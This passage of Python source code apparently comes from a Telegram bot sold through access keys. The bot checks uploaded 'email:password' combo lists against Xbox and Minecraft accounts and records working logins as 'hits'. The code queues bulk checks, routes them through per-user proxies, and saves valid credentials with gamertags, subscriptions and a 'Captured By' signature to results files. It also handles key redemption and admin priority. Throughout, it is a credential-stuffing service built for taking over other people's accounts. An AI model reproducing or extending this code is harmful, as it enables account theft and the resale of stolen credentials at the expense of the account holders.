    )
    return keyboard

# ══════════════════════════════════════════════
# SAVE HIT FUNCTIONS

def save_hit_to_file(result: dict):
    category_map = {
        "Xbox Game Pass Ultimate": "gamepass",
        "Xbox Game Pass": "gamepass",
        "Minecraft": "minecraft",
        "Xbox": "xbox",
        "not_linked": "notlinked"
    }
    
    folder_map = {
        "gamepass": "GamePass",
        "minecraft": "Minecraft",
        "xbox": "Xbox",
        "notlinked": "NotLinked"
    }
    
    category = category_map.get(result["type"], "xbox")
    folder = folder_map.get(category, "Xbox")
    
    os.makedirs(f"Results/{folder}", exist_ok=True)
    
    capture = (
        f"Email         : {result['email']}\n"
        f"Password      : {result['password']}\n"
        f"Gamertag      : {result.get('gamertag', 'N/A')}\n"
        f"Tier          : {result.get('tier', 'N/A')}\n"
        f"Reputation    : {result.get('rep', 'N/A')}\n"
        f"MC Name       : {result['name']}\n"
        f"UUID          : {result['uuid']}\n"
        f"Capes         : {result['capes']}\n"
        f"Type          : {result['type']}\n"
        f"Subscriptions : {result['subscriptions']}\n"
        f"Captured By   : {MY_SIGNATURE}\n"
        f"{'='*50}"
    )
    
    with open(f"Results/{folder}/{category}_hits.txt", "a", encoding="utf-8") as f:
        f.write(capture + "\n")

# ══════════════════════════════════════════════
# FILE DOWNLOAD FUNCTION

async def download_file_safely(file_id: str, file_name: str) -> Optional[str]:
    max_attempts = 3
    file_path = f"data/temp_{file_name}"
    
    for attempt in range(max_attempts):
        try:
            file = await bot.get_file(file_id)
            await bot.download_file(file.file_path, file_path)
            
            if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
                return file_path
            
            if os.path.exists(file_path):
                os.remove(file_path)
                
        except Exception as e:
            print(f"Download attempt {attempt + 1} failed: {e}")
            if attempt == max_attempts - 1:
                return None
            await asyncio.sleep(1)
    
    return None

# ══════════════════════════════════════════════
# MESSAGE FORMATTERS

def format_check_result(result: dict) -> str:
    if not result["success"]:
        emoji = EMOJIS["error"] if result["type"] == "bad" else EMOJIS["warning"]
        return f"{emoji} <b>{result['email']}</b>\n└ {result['error'] or result['type']}"

    emoji_map = {
        "Xbox Game Pass Ultimate": EMOJIS["ultimate"],
        "Xbox Game Pass": EMOJIS["gamepass"],
        "Minecraft": EMOJIS["minecraft"],
        "Xbox": EMOJIS["xbox"],
        "not_linked": EMOJIS["notlinked"]
    }
    emoji = emoji_map.get(result["type"], EMOJIS["hit"])

    return f"""{emoji} <b>🎯 HIT FOUND!</b>
╔════════════════════════════════
║ {EMOJIS['user']} <b>Email:</b> <code>{result['email']}</code>
║ {EMOJIS['key']} <b>Password:</b> <code>{result['password']}</code>
╠════════════════════════════════
║ {EMOJIS['xbox']} <b>Xbox Gamertag:</b> {result.get('gamertag', 'N/A')}
║ {EMOJIS['trophy']} <b>Tier:</b> {result.get('tier', 'N/A')}
║ {EMOJIS['minecraft']} <b>Minecraft Name:</b> {result['name']}
║ {EMOJIS['gem']} <b>UUID:</b> <code>{result['uuid']}</code>
║ {EMOJIS['star']} <b>Capes:</b> {result['capes']}
╠════════════════════════════════
║ {EMOJIS['target']} <b>Type:</b> {result['type']}
║ {EMOJIS['gift']} <b>Subscriptions:</b> {result['subscriptions']}
╚════════════════════════════════
{EMOJIS['owner']} <b>Owner:</b> {OWNER_USERNAME}"""

# ══════════════════════════════════════════════
# QUEUE PROCESSOR

async def process_queue():
    while True:
        try:
            task = check_queue.get_next_task()
            if task:
                user_id = task['user_id']
                task_type = task['task_type']
                data = task['data']
                message = task.get('message_obj')

                try:
                    if task_type == 'single_check':
                        await process_single_check(user_id, data, message)
                    elif task_type == 'file_check':
                        await process_file_check(user_id, data, message)
                    else:
                        logger.warning("Unknown queue task type: %s", task_type)
                except Exception:
                    logger.exception("Queue task failed for user %s", user_id)
                    try:
                        await message.answer(
                            f"{EMOJIS['error']} Task failed safely. "
                            "Please try again."
                        )
                    except Exception:
                        logger.exception("Could not send queue failure message")
                finally:
                    check_queue.complete_task(user_id)
            else:
                await asyncio.sleep(1)
        except Exception as e:
            logger.exception("Queue processor error: %s", e)
            await asyncio.sleep(1)

async def process_single_check(user_id: int, data: dict, message):
    email = data['email']
    password = data['password']
    
    if not has_access(user_id):
        await message.answer(f"{EMOJIS['locked']} Access expired during queue wait! Please get a new key.")
        return
    
    msg = await message.answer(f"{EMOJIS['processing']} <b>Checking</b> <code>{email}</code>...", parse_mode="HTML")
    
    # ⭐ Pass user_id to use their proxy settings
    result = await asyncio.to_thread(check_account_combo, email, password, user_id)
    
    if result["success"]:
        db.update_user(user_id, {"hits": db.get_user(user_id).get("hits", 0) + 1})
        db.add_hit(result)
        save_hit_to_file(result)
        
        await msg.edit_text(format_check_result(result), parse_mode="HTML")
        db.use_key_check(user_id)
        user = db.get_user(user_id)
        await message.answer(
            f"{EMOJIS['stats']} <b>Total Checks:</b> {user.get('total_checks', 0)} | {EMOJIS['target']} <b>Hits:</b> {user.get('hits', 0)}",
            parse_mode="HTML"
        )
    else:
        await msg.edit_text(format_check_result(result), parse_mode="HTML")
    
    await message.answer(
        f"{EMOJIS['processing']} <b>Send another account or return to menu:</b>",
        reply_markup=get_main_keyboard(user_id),
        parse_mode="HTML"
    )

async def process_file_check(user_id: int, data: dict, message):
    file_path = data['file_path']
    
    if not has_access(user_id):
        await message.answer(f"{EMOJIS['locked']} Access expired during queue wait! Please get a new key.")
        if os.path.exists(file_path):
            os.remove(file_path)
        return
    
    try:
        if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
            await message.answer(f"{EMOJIS['error']} File not found or empty!")
            if os.path.exists(file_path):
                os.remove(file_path)
            return
        
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if line.strip() and ':' in line]
        
        if not combos:
            await message.answer(f"{EMOJIS['error']} No valid combos found in file!")
            os.remove(file_path)
            return
        
        total = len(combos)
        progress_msg = await message.answer(f"{EMOJIS['processing']} <b>Checking {total} accounts...</b>\n\n0/{total} done", parse_mode="HTML")
        
        results = {"hits": [], "bad": 0, "2fa": 0, "errors": 0}
        checked = 0
        
        for combo in combos:
            if not has_access(user_id):
                await progress_msg.edit_text(f"{EMOJIS['locked']} Access expired during checking!")
                break
                
            email, password = combo.split(":", 1)
            # ⭐ Pass user_id to use their proxy settings
            result = await asyncio.to_thread(check_account_combo, email, password, user_id)
            
            if result["success"]:
                results["hits"].append(result)
                db.update_user(user_id, {"hits": db.get_user(user_id).get("hits", 0) + 1})
                db.add_hit(result)
                save_hit_to_file(result)
            elif result["type"] == "bad":
                results["bad"] += 1
            elif result["type"] == "2fa":
                results["2fa"] += 1
            else:
                results["errors"] += 1
            
            checked += 1
            db.use_key_check(user_id)
            
            if checked % 5 == 0 or checked == total:
                user = db.get_user(user_id)
                await progress_msg.edit_text(
                    f"{EMOJIS['processing']} <b>Checking {total} accounts...</b>\n\n"
                    f"{EMOJIS['success']} Checked: {checked}/{total}\n"
                    f"{EMOJIS['target']} Hits: {len(results['hits'])}\n"
                    f"{EMOJIS['error']} Bad: {results['bad']}\n"
                    f"{EMOJIS['twofa']} 2FA: {results['2fa']}\n"
                    f"{EMOJIS['warning']} Errors: {results['errors']}\n"
                    f"{EMOJIS['stats']} Total Checks: {user.get('total_checks', 0)}",
                    parse_mode="HTML"
                )
        
        if results["hits"]:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"results_{timestamp}.txt"
            result_filepath = f"data/{result_filename}"
            
            with open(result_filepath, 'w', encoding='utf-8') as rf:
                rf.write(f"Total Hits Found: {len(results['hits'])}\n")
                rf.write("=" * 50 + "\n\n")
                for i, hit in enumerate(results["hits"], 1):
                    rf.write(f"#{i}\n")
                    rf.write(f"Email         : {hit['email']}\n")
                    rf.write(f"Password      : {hit['password']}\n")
                    rf.write(f"Gamertag      : {hit.get('gamertag', 'N/A')}\n")
                    rf.write(f"Tier          : {hit.get('tier', 'N/A')}\n")
                    rf.write(f"Reputation    : {hit.get('rep', 'N/A')}\n")
                    rf.write(f"MC Name       : {hit['name']}\n")
                    rf.write(f"UUID          : {hit['uuid']}\n")
                    rf.write(f"Capes         : {hit['capes']}\n")
                    rf.write(f"Type          : {hit['type']}\n")
                    rf.write(f"Subscriptions: {hit['subscriptions']}\n")
                    rf.write(f"Captured By   : {MY_SIGNATURE}\n")
                    rf.write("-" * 50 + "\n\n")
            
            document = FSInputFile(result_filepath)
            await message.answer_document(
                document=document,
                caption=f"{EMOJIS['file']} <b>All Hits ({len(results['hits'])} found)</b>",
                parse_mode="HTML"
            )
            os.remove(result_filepath)
            
            summary = (
                f"{EMOJIS['success']} <b>File Check Complete!</b>\n\n"
                f"{EMOJIS['stats']} Total: {checked}\n"
                f"{EMOJIS['target']} Hits: {len(results['hits'])}\n"
                f"{EMOJIS['error']} Bad: {results['bad']}\n"
                f"{EMOJIS['twofa']} 2FA: {results['2fa']}\n"
                f"{EMOJIS['warning']} Errors: {results['errors']}"
            )
            await message.answer(summary, parse_mode="HTML")
        else:
            await message.answer(
                f"{EMOJIS['success']} <b>File Check Complete!</b>\n\n"
                f"{EMOJIS['stats']} Total: {checked}\n"
                f"{EMOJIS['target']} Hits: 0\n"
                f"{EMOJIS['error']} Bad: {results['bad']}\n"
                f"{EMOJIS['twofa']} 2FA: {results['2fa']}\n"
                f"{EMOJIS['warning']} Errors: {results['errors']}",
                parse_mode="HTML"
            )
        
        if os.path.exists(file_path):
            os.remove(file_path)
        
    except Exception as e:
        await message.answer(f"{EMOJIS['error']} Error processing file: {str(e)}")
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
        except:
            pass
    
    await message.answer(
        f"{EMOJIS['processing']} <b>Return to menu:</b>",
        reply_markup=get_main_keyboard(user_id),
        parse_mode="HTML"
    )

# ══════════════════════════════════════════════
# BOT HANDLERS

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    user = db.get_user(user_id)
    db.update_user(user_id, {
        "username": message.from_user.username,
        "first_name": message.from_user.first_name
    })
    
    key_status = db.get_user_key_status(user_id)
    
    if is_owner(user_id):
        access_text = f"{EMOJIS['success']} Owner Unlimited Access"
    elif key_status["has_key"]:
        hours_left = key_status["hours_left"]
        days = hours_left // 24
        hours = hours_left % 24
        time_text = f"{days}d {hours}h" if days > 0 else f"{hours}h"
        access_text = f"{EMOJIS['success']} Active | {EMOJIS['clock']} {time_text} left"
    else:
        access_text = f"{EMOJIS['error']} No Active Key | Use /redeem"
    
    admin_tag = f" {EMOJIS['admin_user']} ADMIN" if is_admin(user_id) else ""
    
    # ⭐ User-specific proxy info
    user_proxy_type = user.get("proxy_type", "none")
    user_proxy_count = len(user.get("proxies", []))
    proxy_info = f"{EMOJIS['proxy']} Proxy: {user_proxy_type.upper() if user_proxy_type != 'none' else 'None'} | {user_proxy_count} loaded"
    
    welcome_text = f"""🌟 <b>Welcome to {BOT_NAME}!</b>{admin_tag}
╔════════════════════════════════
║ {EMOJIS['xbox']} Xbox & Minecraft Account Checker
║ {EMOJIS['info']} Version: {BOT_VERSION}
║ {EMOJIS['owner']} Owner: {owner_label(user_id)}
╠════════════════════════════════
║ {EMOJIS['access']} <b>Access:</b> {access_text}
║ {EMOJIS['stats']} <b>Total Checks:</b> {user.get('total_checks', 0)}
║ {EMOJIS['target']} <b>Hits Found:</b> {user.get('hits', 0)}
║ {proxy_info}
╚════════════════════════════════

{EMOJIS['queue']} <b>Queue System:</b> All checks go through queue
{EMOJIS['admin_user']} <b>Admins get priority</b> - Always at front!
{EMOJIS['proxy']} <b>Proxy System:</b> Each user has their OWN proxy settings!

Use the buttons below to get started!"""

    await message.answer(
        welcome_text,
        reply_markup=get_main_keyboard(user_id),
        parse_mode="HTML"
    )
    await message.answer(
        f"{EMOJIS['menu']} <b>Quick Menu:</b>",
        reply_markup=get_inline_menu(),
        parse_mode="HTML"
    )

@dp.message(Command("admin"))
async def cmd_admin(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(f"{EMOJIS['error']} <b>Unauthorized!</b>\nYou are not a bot admin.", parse_mode="HTML")
        return
    
    await message.answer(
        f"{EMOJIS['admin']} <b>Admin Panel</b>\n\nSelect an option:",
        reply_markup=get_admin_inline_menu(),
        parse_mode="HTML"
    )

@dp.message(Command("redeem"))
async def cmd_redeem(message: types.Message, command: CommandObject):
    user_id = message.from_user.id
    
    if not command.args:
        await message.answer(
            f"{EMOJIS['key']} <b>Redeem Key</b>\n\n"
            "Usage: <code>/redeem KEY</code>\n"
            "Example: <code>/redeem CosmoABC123XYZ</code>\n\n"
            f"Contact {OWNER_USERNAME} to get a key.",
            parse_mode="HTML"
        )
        return
    
    key = command.args.strip()
    
    if key not in db.keys:
        await message.answer(
            f"{EMOJIS['error']} <b>Invalid Key!</b>\n\n"
            "The key you entered does not exist.\n"
            "Please check and try again.",
            parse_mode="HTML"
        )
        return
    
    result = db.redeem_key(key, user_id)
    
    if result == -1:
        await message.answer(
            f"{EMOJIS['error']} <b>Key Expired!</b>\n\n"
            "This key has reached its maximum usage limit.",
            parse_mode="HTML"
        )
    elif result == -2:
        await message.answer(
            f"{EMOJIS['warning']} <b>Already Redeemed!</b>\n\n"
            "You have already used this key.",
            parse_mode="HTML"
        )
    elif result == -3:
        await message.answer(
            f"{EMOJIS['error']} <b>Key Expired!</b>\n\n"
            "This key has expired.",
            parse_mode="HTML"
        )
    elif result == -4:
        await message.answer(
            f"{EMOJIS['error']} <b>Key Inactive!</b>\n\n"
            "This key is no longer active.",
            parse_mode="HTML"
        )
    elif result is None:
        await message.answer(
            f"{EMOJIS['error']} <b>Invalid Key!</b>\n\n"
            "Please check the key and try again.",
            parse_mode="HTML"
        )
    else:
        days = result // 24
        hours = result % 24
        time_text = f"{days} day{'s' if days > 1 else ''}" if days > 0 else f"{hours} hours"
        
        await message.answer(
            f"{EMOJIS['success']} <b>Key Redeemed Successfully!</b>\n\n"
            f"{EMOJIS['key']} <b>Key:</b> <code>{key}</code>\n"
            f"{EMOJIS['clock']} <b>Duration:</b> {time_text}\n\n"
            f"You now have access to check accounts!\n"
            f"Use the <b>Check Account</b> button to start.",
            reply_markup=get_main_keyboard(user_id),
            parse_mode="HTML"
        )
        
        db.update_user(user_id, {
            "username": message.from_user.username,
            "first_name": message.from_user.first_name
        })

@dp.message(Command("genkey"))
async def cmd_genkey(message: types.Message, command: CommandObject):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        await message.answer(f"{EMOJIS['error']} Unauthorized! Only owner can generate keys.")
        return
    
    if not command.args:
        await message.answer(
            f"{EMOJIS['gift']} <b>Generate Key</b>\n\n"
            "Usage: <code>/genkey hours,max_uses</code>\n"
            "Example: <code>/genkey 24,100</code> (24 hours, 100 uses)\n"
            "Example: <code>/genkey 72</code> (72 hours, unlimited)",
            parse_mode="HTML"
        )
        return
    
    try:
        parts = command.args.strip().split(",")
        duration_hours = int(parts[0].strip())
        max_uses = int(parts[1].strip()) if len(parts) > 1 and parts[1].strip() else None
        
        if duration_hours <= 0:
            await message.answer(f"{EMOJIS['error']} Duration must be positive!")
            return
        
        key = db.create_key(duration_hours, max_uses, user_id)
        
        days = duration_hours // 24
        hours = duration_hours % 24
        time_text = f"{days}d {hours}h" if days > 0 else f"{hours}h"
        max_uses_text = "Unlimited" if max_uses is None else str(max_uses)
        
        await message.answer(
            f"{EMOJIS['success']} <b>Key Generated!</b>\n\n"
            f"{EMOJIS['key']} <b>Key:</b> <code>{key}</code>\n"
            f"{EMOJIS['clock']} <b>Duration:</b> {time_text}\n"
            f"{EMOJIS['users']} <b>Max Uses:</b> {max_uses_text}\n\n"
            f"Send this key to users: <code>/redeem {key}</code>",
            parse_mode="HTML"
        )
    except ValueError:
        await message.answer(
            f"{EMOJIS['error']} Invalid format! Use: <code>/genkey hours,max_uses</code>",
            parse_mode="HTML"
        )

@dp.message(Command("addadmin"))
async def cmd_addadmin(message: types.Message, command: CommandObject):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        await message.answer(f"{EMOJIS['error']} Unauthorized! Only owner can add admins.")
        return
    
    if not command.args:
        await message.answer(
            f"{EMOJIS['admin_user']} <b>Add Admin</b>\n\n"
            "Usage: <code>/addadmin USER_ID</code>\n"
            "Example: <code>/addadmin 123456789</code>\n\n"
            "Get user ID from: <code>/getid</code>",
            parse_mode="HTML"
        )
        return
    
    try:
        new_admin_id = int(command.args.strip())
        
        if new_admin_id in ADMIN_IDS:
            await message.answer(f"{EMOJIS['warning']} User {new_admin_id} is already an admin!")
            return
        
        ADMIN_IDS.append(new_admin_id)
        await message.answer(
            f"{EMOJIS['success']} <b>Admin Added!</b>\n\n"
            f"{EMOJIS['user']} <b>User ID:</b> <code>{new_admin_id}</code>\n"
            f"{EMOJIS['users']} <b>Total Admins:</b> {len(ADMIN_IDS)}\n\n"
            f"User can now use /admin panel.",
            parse_mode="HTML"
        )
        
        try:
            await bot.send_message(
                new_admin_id,
                f"{EMOJIS['gift']} <b>You've been added as an admin!</b>\n\n"
                f"You now have access to the admin panel.\n"
                f"Use <code>/admin</code> to open it.",
                parse_mode="HTML"
            )
        except:
            pass
            
    except ValueError:
        await message.answer(f"{EMOJIS['error']} Invalid ID! Use: <code>/addadmin USER_ID</code>", parse_mode="HTML")

@dp.message(Command("removeadmin"))
async def cmd_removeadmin(message: types.Message, command: CommandObject):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        await message.answer(f"{EMOJIS['error']} Unauthorized! Only owner can remove admins.")
        return
    
    if not command.args:
        await message.answer(
            f"{EMOJIS['admin_user']} <b>Remove Admin</b>\n\n"
            "Usage: <code>/removeadmin USER_ID</code>\n"
            "Example: <code>/removeadmin 123456789</code>",
            parse_mode="HTML"
        )
        return
    
    try:
        remove_id = int(command.args.strip())
        
        if remove_id == OWNER_ID:
            await message.answer(f"{EMOJIS['error']} Cannot remove the owner!")
            return
        
        if remove_id not in ADMIN_IDS:
            await message.answer(f"{EMOJIS['warning']} User {remove_id} is not an admin!")
            return
        
        ADMIN_IDS.remove(remove_id)
        await message.answer(
            f"{EMOJIS['success']} <b>Admin Removed!</b>\n\n"
            f"{EMOJIS['user']} <b>User ID:</b> <code>{remove_id}</code>\n"
            f"{EMOJIS['users']} <b>Total Admins:</b> {len(ADMIN_IDS)}",
            parse_mode="HTML"
        )
            
    except ValueError:
        await message.answer(f"{EMOJIS['error']} Invalid ID! Use: <code>/removeadmin USER_ID</code>", parse_mode="HTML")

@dp.message(Command("admins"))
async def cmd_listadmins(message: types.Message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        await message.answer(f"{EMOJIS['error']} Unauthorized!")
        return
    
    text = f"{EMOJIS['admin_user']} <b>Admin List</b>\n\n"
    text += f"{EMOJIS['owner']} <b>Owner:</b> <code>{OWNER_ID}</code> {EMOJIS['star']}\n"
    text += "─" * 20 + "\n"
    
    for i, admin_id in enumerate(ADMIN_IDS, 1):
        if admin_id == OWNER_ID:
            continue
        text += f"{i}. <code>{admin_id}</code>\n"
    
    await message.answer(text, parse_mode="HTML")

@dp.message(Command("getid"))
async def cmd_getid(message: types.Message):
    user_id = message.from_user.id
    
    if message.reply_to_message:
        target_id = message.reply_to_message.from_user.id
        target_name = message.reply_to_message.from_user.first_name
        await message.answer(
            f"{EMOJIS['user']} <b>User ID:</b> <code>{target_id}</code>\n"
            f"{EMOJIS['user']} <b>Name:</b> {target_name}\n\n"
            f"Use: <code>/addadmin {target_id}</code>",
            parse_mode="HTML"
        )
    else:
        await message.answer(
            f"{EMOJIS['user']} <b>Your ID:</b> <code>{user_id}</code>\n\n"
            f"Reply to someone's message with <code>/getid</code> to get their ID.",
            parse_mode="HTML"
        )

# ─── Main Menu Handlers ───

@dp.message(F.text == f"{EMOJIS['queue']} Queue Status")
async def menu_queue_status(message: types.Message, viewer_id: Optional[int] = None):
    user_id = viewer_id if viewer_id is not None else message.from_user.id
    
    status = check_queue.get_queue_status()
    position = check_queue.get_queue_position(user_id)
    
    is_admin_user = is_admin(user_id)
    
    text = f"{EMOJIS['queue']} <b>Queue Status</b>\n"
    text += f"╔════════════════════════════════\n"
    text += f"║ {EMOJIS['stats']} <b>Total Pending:</b> {status['total']}\n"
    text += f"║ {EMOJIS['admin_user']} <b>Admin Tasks:</b> {status['admins']}\n"
    text += f"║ {EMOJIS['user']} <b>User Tasks:</b> {status['users']}\n"
    
    if position:
        text += f"╠════════════════════════════════\n"
        text += f"║ {EMOJIS['target']} <b>Your Position:</b> #{position}\n"
        if is_admin_user:
            text += f"║ {EMOJIS['status']} <b>Status:</b> {EMOJIS['success']} Admin Priority\n"
        else:
            text += f"║ {EMOJIS['status']} <b>Status:</b> {EMOJIS['waiting']} Waiting\n"
    else:
        text += f"╠════════════════════════════════\n"
        text += f"║ {EMOJIS['info']} <b>You have no pending tasks</b>\n"
    
    text += f"╚════════════════════════════════"
    
    await message.answer(text, reply_markup=get_main_keyboard(user_id), parse_mode="HTML")

@dp.message(F.text == f"{EMOJIS['check']} Check Account")
async def menu_check_account(message: types.Message, viewer_id: Optional[int] = None):
    user_id = viewer_id if viewer_id is not None else message.from_user.id
    
    key_status = db.get_user_key_status(user_id)
    if not has_access(user_id):
        await message.answer(
            f"{EMOJIS['locked']} <b>Access Denied!</b>\n\n"
            "You don't have an active key.\n"
            "Please redeem a key using: <code>/redeem KEY</code>\n\n"
            f"Contact {OWNER_USERNAME} to get a key.",
            parse_mode="HTML"
        )
        return
    
    if is_owner(user_id):
        time_text = "Unlimited"
    else:
        hours_left = key_status["hours_left"]
        days = hours_left // 24
        hours = hours_left % 24
        time_text = f"{days}d {hours}h" if days > 0 else f"{hours}h"
    
    queue_len = check_queue.get_queue_length()
    is_admin_user = is_admin(user_id)
    if is_admin_user:
        priority_text = f"{EMOJIS['admin_user']} ADMIN PRIORITY"
    else:
        priority_text = f"{EMOJIS['waiting']} {queue_len} users ahead"
    
    # ⭐ User-specific proxy info
    user = db.get_user(user_id)
    user_proxy_type = user.get("proxy_type", "none")
    user_proxy_count = len(user.get("proxies", []))
    proxy_info = f"{EMOJIS['proxy']} Proxy: {user_proxy_type.upper() if user_proxy_type != 'none' else 'None'} | {user_proxy_count} loaded"
    
    await message.answer(
        f"{EMOJIS['success']} <b>Access Granted!</b> {EMOJIS['clock']} {time_text} left\n"
        f"{EMOJIS['queue']} <b>Queue Status:</b> {priority_text}\n"
        f"{proxy_info}\n\n"
        f"{EMOJIS['check']} <b>Send the account in format:</b>\n"
        "<code>email:password</code>\n\n"
        "Example: <code>user@example.com:password123</code>\n\n"
        f"{EMOJIS['locked']} Your account will be checked and result shown here.",
        parse_mode="HTML"
    )
    
    @dp.message(F.text & F.text.contains(":"))
    async def handle_single_check(message: types.Message):
        user_id = message.from_user.id
        
        if not has_access(user_id):
            await message.answer(f"{EMOJIS['locked']} Access expired! Please get a new key.")
            return
        
        parts = message.text.strip().split(":", 1)
        if len(parts) != 2:
            await message.answer(f"{EMOJIS['error']} Invalid format! Use: <code>email:password</code>", parse_mode="HTML")
            return
        
        email, password = parts
        
        position = check_queue.get_queue_position(user_id)
        if position is not None:
            await message.answer(
                f"{EMOJIS['waiting']} <b>You already have a task in queue!</b>\n"
                f"{EMOJIS['queue']} <b>Your position:</b> #{position}\n\n"
                f"Please wait for your current task to complete.",
                parse_mode="HTML"
            )
            return
        
        task_data = {'email': email, 'password': password}
        position = check_queue.add_to_queue(user_id, 'single_check', task_data, message)
        
        if position == -1:
            await message.answer(f"{EMOJIS['waiting']} You already have a pending task!")
            return
        if position == -2:
            await message.answer(
                f"{EMOJIS['warning']} Queue is full right now. "
                "Please try again in a few minutes."
            )
            return
        
        is_admin_user = is_admin(user_id)
        if is_admin_user:
            priority_text = f"{EMOJIS['admin_user']} Admin"
        else:
            priority_text = f"{EMOJIS['user']} User"
        
        await message.answer(
            f"{EMOJIS['success']} <b>Added to Queue!</b>\n"
            f"{EMOJIS['queue']} <b>Position:</b> #{position + 1}\n"
            f"{EMOJIS['admin_user']} <b>Priority:</b> {priority_text}\n\n"
            f"{EMOJIS['waiting']} Please wait... You'll be notified when your check starts.",
            parse_mode="HTML"
        )

@dp.message(F.text == f"{EMOJIS['file']} Check File")
async def menu_check_file(message: types.Message, viewer_id: Optional[int] = None):
    user_id = viewer_id if viewer_id is not None else message.from_user.id
    
    key_status = db.get_user_key_status(user_id)
    if not has_access(user_id):
        await message.answer(
            f"{EMOJIS['locked']} <b>Access Denied!</b>\n\n"
            "You don't have an active key.\n"
            "Please redeem a key using: <code>/redeem KEY</code>",
            parse_mode="HTML"
        )
        return
    
    if is_owner(user_id):
        time_text = "Unlimited"
    else:
        hours_left = key_status["hours_left"]
        days = hours_left // 24
        hours = hours_left % 24
        time_text = f"{days}d {hours}h" if days > 0 else f"{hours}h"
    
    # ⭐ User-specific proxy info
    user = db.get_user(user_id)
    user_proxy_type = user.get("proxy_type", "none")
    user_proxy_count = len(user.get("proxies", []))
    proxy_info = f"{EMOJIS['proxy']} Proxy: {user_proxy_type.upper() if user_proxy_type != 'none' else 'None'} | {user_proxy_count} loaded"
    
    await message.answer(
        f"{EMOJIS['success']} <b>Access Granted!</b> {EMOJIS['clock']} {time_text} left\n"
        f"{proxy_info}\n\n"
        f"{EMOJIS['file']} <b>Send a .txt file with accounts</b>\n\n"
        "Format: <code>email:password</code> (one per line)\n\n"
        f"{EMOJIS['warning']} <b>Note:</b> File will be processed in queue order.",
        parse_mode="HTML"
    )

@dp.message(F.document & F.document.file_name.endswith(".txt"))
async def handle_file_check(message: types.Message):
    user_id = message.from_user.id
    
    if not has_access(user_id):
        await message.answer(f"{EMOJIS['locked']} Access expired! Please get a new key.")
        return
    
    position = check_queue.get_queue_position(user_id)
    if position is not None:
        await message.answer(
            f"{EMOJIS['waiting']} <b>You already have a task in queue!</b>\n"
            f"{EMOJIS['queue']} <b>Your position:</b> #{position}\n\n"
            f"Please wait for your current task to complete.",
            parse_mode="HTML"
        )
        return
    
    file_id = message.document.file_id
    file_name = message.document.file_name
    
    status_msg = await message.answer(f"{EMOJIS['processing']} <b>Downloading file...</b>", parse_mode="HTML")
    
    file_path = await download_file_safely(file_id, file_name)
    
    if not file_path:
        await status_msg.edit_text(
            f"{EMOJIS['error']} <b>Failed to download file!</b>\n\n"
            "Please try again or send a different file.",
            parse_mode="HTML"
        )
        return
    
    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
        await status_msg.edit_text(
            f"{EMOJIS['error']} <b>File is empty or corrupted!</b>\n\n"
            "Please check the file and try again.",
            parse_mode="HTML"
        )
        if os.path.exists(file_path):
            os.remove(file_path)
        return
    
    await status_msg.edit_text(f"{EMOJIS['success']} <b>File downloaded! Adding to queue...</b>", parse_mode="HTML")
    
    task_data = {'file_path': file_path}
    position = check_queue.add_to_queue(user_id, 'file_check', task_data, message)

    if position == -1:
        if os.path.exists(file_path):
            os.remove(file_path)
        await status_msg.edit_text(
            f"{EMOJIS['waiting']} You already have a task in queue.",
            parse_mode="HTML",
        )
        return
    if position == -2:
        if os.path.exists(file_path):
            os.remove(file_path)
        await status_msg.edit_text(
            f"{EMOJIS['warning']} Queue is full right now. "
            "Please try again in a few minutes.",
            parse_mode="HTML",
        )
        return
    
    is_admin_user = is_admin(user_id)
    if is_admin_user:
        priority_text = f"{EMOJIS['admin_user']} Admin"
    else:
        priority_text = f"{EMOJIS['user']} User"
    
    await status_msg.edit_text(
        f"{EMOJIS['success']} <b>File Added to Queue!</b>\n"
        f"{EMOJIS['queue']} <b>Position:</b> #{position + 1}\n"
        f"{EMOJIS['admin_user']} <b>Priority:</b> {priority_text}\n\n"
        f"{EMOJIS['waiting']} Please wait... You'll be notified when your file check starts.",
        parse_mode="HTML"
    )

@dp.message(F.text == f"{EMOJIS['stats']} My Stats")
async def menu_stats(message: types.Message, viewer_id: Optional[int] = None):
    user_id = viewer_id if viewer_id is not None else message.from_user.id
    user = db.get_user(user_id)
    
    total_checks = user.get('total_checks', 0)
    hits = user.get('hits', 0)
    efficiency = f"{(hits / total_checks * 100):.1f}%" if total_checks > 0 else "0%"
    
    key_status = db.get_user_key_status(user_id)
    if is_owner(user_id):
        access_text = f"{EMOJIS['success']} Owner Unlimited Access"
    elif key_status["has_key"]:
        hours_left = key_status["hours_left"]
        days = hours_left // 24
        hours = hours_left % 24
        time_text = f"{days}d {hours}h" if days > 0 else f"{hours}h"
        access_text = f"{EMOJIS['success']} Active | {EMOJIS['clock']} {time_text} left"
    else:
        access_text = f"{EMOJIS['error']} No Active Key"
    
    position = check_queue.get_queue_position(user_id)
    queue_text = f"#{position}" if position else "No pending"
    
    admin_tag = f" {EMOJIS['admin_user']} ADMIN" if is_admin(user_id) else ""
    
    # ⭐ User-specific proxy info
    user_proxy_type = user.get("proxy_type", "none")
    user_proxy_count = len(user.get("proxies", []))
    proxy_info = f"{EMOJIS['proxy']} {user_proxy_type.upper() if user_proxy_type != 'none' else 'None'} ({user_proxy_count})"
    
    stats_text = f"""{EMOJIS['stats']} <b>Your Statistics</b>{admin_tag}
╔════════════════════════════════
║ {EMOJIS['user']} <b>User:</b> {message.from_user.first_name}
║ {EMOJIS['gem']} <b>ID:</b> {user_id}
║ {EMOJIS['calendar']} <b>Joined:</b> {user.get('joined', 'N/A')[:10]}
╠════════════════════════════════
║ {EMOJIS['access']} <b>Access:</b> {access_text}
║ {EMOJIS['stats']} <b>Total Checks:</b> {total_checks}
║ {EMOJIS['target']} <b>Hits Found:</b> {hits}
║ {EMOJIS['thunder']} <b>Efficiency:</b> {efficiency}
╠════════════════════════════════
║ {EMOJIS['proxy']} <b>Proxy:</b> {proxy_info}
║ {EMOJIS['queue']} <b>Queue Position:</b> {queue_text}
╚════════════════════════════════"""

